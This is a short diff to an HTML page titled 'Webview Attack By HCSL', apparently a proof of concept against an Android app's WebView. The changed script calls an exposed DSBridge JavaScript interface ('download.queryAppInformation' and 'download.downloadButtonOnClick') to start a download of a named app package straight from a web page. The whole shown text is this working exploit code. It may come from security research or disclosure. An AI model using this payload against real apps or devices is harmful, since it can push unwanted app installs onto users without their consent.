@@ -5,9 +5,10 @@
     <title>Webview Attack By HCSL</title>
     <script>
         function downloadApp(){
-        var package = {'packageName' : 'com.zhiliao.musically.livewallpaper'};
-        var handler;
-        window._dsbridge.downloadButtonOnClick(package,handler)
+        var queryAppInformation_parameters = "{\"data\":{\"apkId\":\"com.zhiliao.musically.livewallpaper\"}}";
+        window._dsbridge.call("download.queryAppInformation",queryAppInformation_parameters);
+        var downloadButtonOnClick_parameters = "{\"data\":{\"packageName\":\"com.zhiliao.musically.livewallpaper\"}}";
+        window._dsbridge.call("download.downloadButtonOnClick",downloadButtonOnClick_parameters)
         }
     </script>
 </head>
